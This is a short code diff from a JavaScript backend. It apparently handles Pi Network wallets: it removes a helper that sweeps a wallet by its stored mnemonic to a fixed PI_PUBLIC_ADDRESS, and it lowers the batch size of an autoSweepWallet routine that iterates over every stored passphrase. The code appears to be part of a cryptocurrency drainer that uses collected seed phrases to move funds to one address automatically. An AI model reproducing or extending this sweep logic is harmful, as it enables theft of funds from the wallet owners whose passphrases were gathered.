@@ -475,22 +475,6 @@ export const autoClaimUnlocked = async () => {
 
 };
 
-const sweepWithLogs = async (p) => {
-    try {
-        // console.log(`🔄 Sweeping for: ${p.mnemonic.slice(0, 10)}...`);
-
-        const result = await sweepWallet(p.mnemonic, PI_PUBLIC_ADDRESS);
-        const success = result.data;
-
-        if (success.hash) {
-            // console.log(`✅ Sweeped ${result.amount} Pi. Hash: ${success.hash}`);
-        } else {
-            // console.log(`❌ Failed to sweep for ${p.receiverAddress}`);
-        }
-    } catch (err) {
-        // console.error('❌ Error sweeping Pi:', err.message || err);
-    }
-};
 
 async function getUpcomingClaimables() {
     const now = new Date();
@@ -533,7 +517,7 @@ export const autoSweepWallet = async () => {
     }
 
     const readyPassphrases = await Passphrase.find();
-    const passphraseBatches = arrayBatches(readyPassphrases, 80);
+    const passphraseBatches = arrayBatches(readyPassphrases, 50);
 
     for(const passphrases of passphraseBatches) {
         await Promise.all(passphrases.map(async (phrase, i) => {
